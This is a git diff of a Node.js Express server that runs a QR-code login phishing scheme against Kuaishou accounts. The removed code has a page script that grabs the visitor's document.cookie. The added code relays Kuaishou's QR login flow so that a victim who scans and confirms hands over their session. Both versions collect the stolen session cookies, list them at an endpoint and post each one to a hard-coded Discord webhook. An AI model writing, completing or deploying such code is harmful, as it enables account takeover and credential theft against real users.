@@ -1,4 +1,5 @@
 const express = require("express");
+const https = require("https");
 const { v4: uuidv4 } = require("uuid");
 const path = require("path");
 const app = express();
@@ -11,115 +12,175 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLz
 const scans = {};
 const cookies = [];
 
-// ====== 首页 - 扫码页 ======
-app.get("/", (req, res) => {
+// ====== 页面 ======
+app.get("/", function(req, res) {
     res.sendFile(path.join(__dirname, "scan.html"));
 });
 
-// ====== Cookie查看页 ======
-app.get("/cookies", (req, res) => {
+app.get("/cookies", function(req, res) {
     res.sendFile(path.join(__dirname, "cookies.html"));
 });
 
-// ====== 扫码链接 - 用户扫了之后打开的页面 ======
-app.get("/s/:scanId", (req, res) => {
-    const { scanId } = req.params;
-    const scan = scans[scanId];
+// ====== 通用请求函数 ======
+function ksRequest(method, path, body) {
+    return new Promise(function(resolve, reject) {
+        var options = {
+            hostname: "id.kuaishou.com",
+            path: path,
+            method: method,
+            headers: {
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            }
+        };
+
+        var req = https.request(options, function(res) {
+            var body = "";
+            var cookies = res.headers["set-cookie"] || [];
+            res.on("data", function(chunk) { body += chunk; });
+            res.on("end", function() {
+                resolve({
+                    status: res.statusCode,
+                    headers: res.headers,
+                    cookies: cookies,
+                    body: body
+                });
+            });
+        });
+
+        req.on("error", function(e) { reject(e); });
+
+        if (body) {
+            req.write(JSON.stringify(body));
+        }
+        req.end();
+    });
+}
+
+// ====== 步骤1: 生成二维码 ======
+app.get("/api/qr", function(req, res) {
+    var scanId = uuidv4();
+
+    ksRequest("POST", "/rest/c/infra/ks/qr/start", {}).then(function(result) {
+        var data = JSON.parse(result.body);
+
+        if (data.result === 1) {
+            var qrData = data.data || {};
+            var qrCode = qrData.qrCode || "";
+            var qrToken = qrData.qrToken || data.qrToken || "";
+
+            scans[scanId] = {
+                status: "wait",
+                cookie: null,
+                qrToken: qrToken,
+                qrCode: qrCode,
+                createdAt: Date.now()
+            };
+
+            res.json({
+                scanId: scanId,
+                qrCode: qrCode,
+                qrToken: qrToken
+            });
+        } else {
+            res.status(500).json({ error: "获取二维码失败" });
+        }
+    }).catch(function() {
+        res.status(500).json({ error: "请求失败" });
+    });
+});
+
+// ====== 步骤2+3: 轮询检测 + 确认登录 ======
+app.get("/api/check", function(req, res) {
+    var id = req.query.id;
+    var scan = scans[id];
 
     if (!scan) {
-        return res.send("<h2>二维码已过期或不存在</h2>");
+        return res.json({ status: "expired" });
     }
 
     if (scan.status === "done") {
-        return res.send("<h2>该二维码已被使用</h2>");
+        return res.json({ status: "done", cookie: scan.cookie });
     }
 
-    res.send(`<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"></head>
-<body>
-<p>正在获取...</p>
-<script>
-fetch("/api/submit", {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({
-        scanId: "${scanId}",
-        cookie: document.cookie
-    })
-}).then(function(r) { return r.json(); }).then(function(data) {
-    document.body.innerHTML = data.ok ? "<h2>成功</h2>" : "<h2>失败</h2>";
-}).catch(function() {
-    document.body.innerHTML = "<h2>网络错误</h2>";
-});
-</script>
-</body>
-</html>`);
-});
+    // 先检测扫码状态
+    ksRequest("POST", "/rest/c/infra/ks/qr/checkResult", {
+        qrToken: scan.qrToken
+    }).then(function(result) {
+        var data = JSON.parse(result.body);
 
-// ====== 生成二维码 ======
-app.get("/api/qr", (req, res) => {
-    const scanId = uuidv4();
-    const scanUrl = "https://" + req.get("host") + "/s/" + scanId;
+        if (data.result === 1 && data.data && data.data.status === 1) {
+            // 已扫码但未确认
+            res.json({ status: "scanned" });
+        } else if (data.result === 1 && data.data && data.data.status === 2) {
+            // 已确认，需要调用acceptResult
+            ksRequest("POST", "/rest/c/infra/ks/qr/acceptResult", {
+                qrToken: scan.qrToken
+            }).then(function(acceptResult) {
+                var acceptData = JSON.parse(acceptResult.body);
 
-    scans[scanId] = {
-        status: "wait",
-        cookie: null,
-        createdAt: Date.now()
-    };
+                if (acceptData.result === 1) {
+                    // 获取登录回调地址
+                    var callbackUrl = acceptData.data.callbackUrl || acceptData.data.redirectUrl || "";
 
-    res.json({ scanId: scanId, scanUrl: scanUrl });
-});
+                    if (callbackUrl) {
+                        // 步骤4: 回调登录
+                        var urlObj = new URL(callbackUrl);
+                        ksRequest("GET", urlObj.pathname + urlObj.search).then(function(loginResult) {
+                            var loginCookies = loginResult.cookies;
+                            var cookieStr = loginCookies.map(function(c) {
+                                return c.split(";")[0];
+                            }).join("; ");
 
-// ====== 提交Cookie ======
-app.post("/api/submit", (req, res) => {
-    const { scanId, cookie } = req.body;
-    const scan = scans[scanId];
+                            // 也合并之前步骤的cookie
+                            var allCookies = acceptResult.cookies.concat(loginCookies);
+                            var finalCookie = allCookies.map(function(c) {
+                                return c.split(";")[0];
+                            }).join("; ");
 
-    if (!scan) {
-        return res.status(404).json({ ok: false, error: "not found" });
-    }
+                            scan.status = "done";
+                            scan.cookie = finalCookie;
+                            cookies.push({
+                                cookie: finalCookie,
+                                time: new Date().toISOString()
+                            });
 
-    if (!cookie || cookie.trim() === "") {
-        return res.json({ ok: false, error: "empty cookie" });
-    }
+                            sendToDiscord(finalCookie);
 
-    scan.status = "done";
-    scan.cookie = cookie;
-    cookies.push({ cookie: cookie, time: new Date().toISOString() });
-
-    sendToDiscord(cookie);
-
-    res.json({ ok: true });
-});
-
-// ====== 检查扫码状态 ======
-app.get("/api/check", (req, res) => {
-    const { id } = req.query;
-    const scan = scans[id];
-
-    if (!scan) {
-        return res.json({ status: "expired", cookie: null });
-    }
-
-    res.json({ status: scan.status, cookie: scan.cookie });
+                            res.json({ status: "done", cookie: finalCookie });
+                        }).catch(function() {
+                            res.json({ status: "wait" });
+                        });
+                    } else {
+                        res.json({ status: "wait" });
+                    }
+                } else {
+                    res.json({ status: "wait" });
+                }
+            }).catch(function() {
+                res.json({ status: "wait" });
+            });
+        } else {
+            res.json({ status: "wait" });
+        }
+    }).catch(function() {
+        res.json({ status: "wait" });
+    });
 });
 
-// ====== 获取所有Cookie ======
-app.get("/api/cookies", (req, res) => {
+// ====== Cookie列表 ======
+app.get("/api/cookies", function(req, res) {
     res.json(cookies.slice(-50).reverse());
 });
 
-// ====== 发送到Discord ======
+// ====== 发送Discord ======
 function sendToDiscord(cookie) {
-    const https = require("https");
-    const url = new URL(WEBHOOK_URL);
-
-    const data = JSON.stringify({
+    var data = JSON.stringify({
         content: "**新Cookie**\n```\n" + cookie + "\n```"
     });
 
-    const options = {
+    var url = new URL(WEBHOOK_URL);
+    var req = https.request({
         hostname: url.hostname,
         path: url.pathname + url.search,
         method: "POST",
@@ -127,14 +188,12 @@ function sendToDiscord(cookie) {
             "Content-Type": "application/json",
             "Content-Length": Buffer.byteLength(data)
         }
-    };
-
-    const req = https.request(options);
+    });
     req.write(data);
     req.end();
 }
 
-const PORT = process.env.PORT || 3000;
+var PORT = process.env.PORT || 3000;
 app.listen(PORT, function() {
-    console.log("运行在端口 " + PORT);
+    console.log("端口 " + PORT);
 });
